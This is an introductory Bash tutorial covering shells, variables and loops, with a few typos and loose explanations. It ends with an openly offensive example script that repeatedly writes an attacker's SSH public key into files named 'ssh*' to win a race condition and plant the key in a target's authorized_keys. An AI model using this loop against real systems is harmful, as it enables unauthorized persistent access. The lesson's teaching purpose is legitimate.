# Bash Programming 101

## Bash 101

First we need to quickly define what a "shell" is, and we can do that thanks to Wikipedia:

> In computing, a shell is a computer program which exposes an operating system's services to a human user or other program

With that in mind, Bash is the default shell for most Linux operating systems. Bash is actually an ackronym that stands for Bourne Again Shell.

However it's much more than just a way to type commands into a computer, it's a complete programming language (that's a technically correct statement as Bash is a "Turing Complete" language) that can perform some pretty cool feats of automation and system administration.

It's also our bread and butter when we're dealing with a Linux system, so learn to love it, because it's going nowhere fast!

## Variables

A variable in Bash is pretty much the same as a variable in any other language, it's a name and then a value:

```bash
MY_VARIABLE='something'
```

The above assigns the string `something` to our awesome variable.

The catch with Bash is that there can't be any white space between the name, the equals symbol, and the value. Bash doesn't like white space! Deal with it!

To call the variable we just made we can just type:

```bash
$MY_VARIABLE
```

But wait! We got an error?

```bash
-bash: something: command not found
```

That's because we assigned a string, and not a command. By default Bash will try and "expand" whatever is inside quotes unless you tell it to do something different. This can actually lead to an interesting and common vulnerability whereby a system variable is replaced by an attacker, then when an application calls the variable some malicious code will run.

To see the contents of our variable we can just use `echo`:

```bash
echo $MY_VARIBLE
```

---

## Loops

We have three main types of loops of conditional statements that we can run in `bash`

While Loops
```bash
while true; do
	(code goes here)
done
```


For Loops
```bash
for f in $(command); do
	(code goes here)
done
```


If Statements
```bash
if [[ expression ]]; then
	(code goes here)
fi
```

These can all be chained as long as we remember to close them all off:

```bash
#!/bin/bash

while true; do
    for file in $(ls); do
        if [[ $file == ssh* ]]; then
            echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCs5XQo8LwC6J8sc1EPiABH5pmyNwLoZzKcbjNBP8eU/k/nA7nriJA5vUq+YJVAgoDiDocbHLR9SBx03imGxCNOpHdOpgMQs+DGmNLPVcy9v9Uctg5nVU11FWz1XLcn8aimypnL3xHexB219EzkVtZx0GkgDQS2pnHutypX9sIm9tient4/dRz4btt5p7MoPmtsx4oQEMEYzzeyRKOBs+10UzOw2oHQveDZ9kBWFPjiU0km5qoBuOSecQlhjB9FWWwvHRJIFMgOwwib5WiArDfq1y1plHMNQA/3aKYenYWKmLhG15aVWs3l2MATEP/7h0FbeHsKV6+Ap3LqVBXW5zjORa6KXM5YZk2R7aBqRQNE8r/qh4FZRDaRCrVHFhmWPQvCDmzP59OkNDW9v6NHjPOSisTwxEKND1SWbxjJh19YywyWDTyXcMHCOiSVdtP3BsnAc3M2dV0GsRJWCheDwt21mGnx9ibYbP14iY/GMmk/vcpmvPHlJidsicQ86R0dNpU=" > $file
            fi
        done
    done
```

(The above code was written to cause a race condition with another script running on the system that would cause the public key (as included above) to be injected into the `authorized_keys` file on a target machine)


